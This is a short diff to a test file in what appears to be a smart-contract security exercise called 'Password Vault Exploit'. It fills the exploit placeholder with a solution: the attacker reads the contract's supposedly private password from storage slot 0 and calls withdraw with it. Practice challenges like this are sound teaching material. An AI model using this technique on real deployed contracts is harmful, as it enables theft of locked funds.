@@ -23,7 +23,8 @@ describe('[PASSWORD VAULT EXPLOIT]', async function () {
 
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
-
+        const password = await ethers.provider.getStorageAt(this.vault.address,0);
+        await this.vault.connect(attacker).withdraw(password);
     })
 
     after(async function () {
